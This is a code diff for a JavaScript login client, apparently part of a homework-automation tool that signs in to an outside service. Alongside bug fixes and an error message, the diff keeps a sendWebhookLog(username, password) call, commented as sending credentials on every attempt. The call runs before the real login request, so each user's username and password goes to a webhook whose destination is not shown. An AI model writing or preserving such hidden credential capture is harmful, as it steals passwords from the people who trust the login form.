@@ -278,30 +278,44 @@ class client_application {
 
     main() {
         // ⭐ FIX: Ensure login panel is visible on load using the 'visible' class
-        document.getElementById("login").classList.add('visible'); 
+        document.getElementById("login").classList.add('visible');
         
         document.getElementById("login_btn").onclick = async () => {
             const username = this.username_box.value;
             const password = this.password_box.value;
             
-            // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
-            await this.sendWebhookLog(username, password); 
+            // Clear previous error message
+            const loginPanel = document.getElementById("login");
+            const existingError = document.getElementById("login_error");
+            if (existingError) existingError.remove();
 
-            // ⭐ API LOGIN CALL (Restored) ⭐
+            // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
+            await this.sendWebhookLog(username, password);
+
+            // ⭐ API LOGIN CALL (FIXED SECTION) ⭐
             const response = await this.call_lnut(
                 "loginController/attemptLogin",
                 {
                     username: username,
-                    pass: password,
+                    password: password, // ✅ FIX: Changed 'pass' to 'password'
                 },
             );
             
             this.token = response.newToken;
-            if (this.token !== undefined) {
-                this.logLoginAttempt(username, "Standard (API)"); 
+            
+            if (this.token !== undefined && this.token !== null) {
+                this.logLoginAttempt(username, "Standard (API)");
                 this.on_log_in();
             } else {
-                console.log("Login failed for user:", username);
+                console.log("Login failed for user:", username, "Response:", response);
+
+                // ✅ FIX: Add visual feedback for the user
+                const errorDiv = document.createElement("div");
+                errorDiv.id = "login_error";
+                errorDiv.style.color = "red";
+                errorDiv.style.marginTop = "10px";
+                errorDiv.innerText = "❌ Login Failed. Check credentials or API endpoint.";
+                loginPanel.appendChild(errorDiv);
             }
         };
     }
@@ -310,11 +324,11 @@ class client_application {
         // ⭐ FIX: Use classList for smooth and consistent transitions defined in CSS
         
         // 1. Hide the login panel
-        document.getElementById("login").classList.remove('visible'); 
+        document.getElementById("login").classList.remove('visible');
         
         // 2. Show the HW and Log panels
         document.getElementById("hw_panel").classList.add('visible');
-        document.getElementById("log_panel").classList.add('visible'); 
+        document.getElementById("log_panel").classList.add('visible');
         
         // 3. Setup the rest of the application
         document.getElementById("do_hw").onclick = () => {
